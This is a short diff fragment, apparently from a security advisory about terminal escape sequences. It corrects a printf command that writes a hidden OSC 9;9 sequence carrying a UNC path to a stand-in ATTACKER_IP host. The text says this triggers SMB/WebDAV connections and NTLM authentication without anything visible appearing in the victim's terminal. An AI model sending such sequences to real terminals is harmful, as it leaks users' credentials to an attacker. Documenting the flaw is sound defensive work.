@@ -9,7 +9,7 @@ That can trigger outbound SMB/WebDAV traffic and NTLM authentication.
 A terminal output stream can send this:
 
 ```bash
-printf '\\\\x1b]9;9;\\\\\\\\\\\\\\\\ATTACKER\\\_IP\\\\\\\\share\\\\x1b\\\\\\\\' > /dev/pts/2
+printf '\x1b]9;9;\\\\ATTACKER_IP\\share\x1b\\' > /dev/pts/2
 ```
 
 The UNC path does not visibly print in the victim terminal.
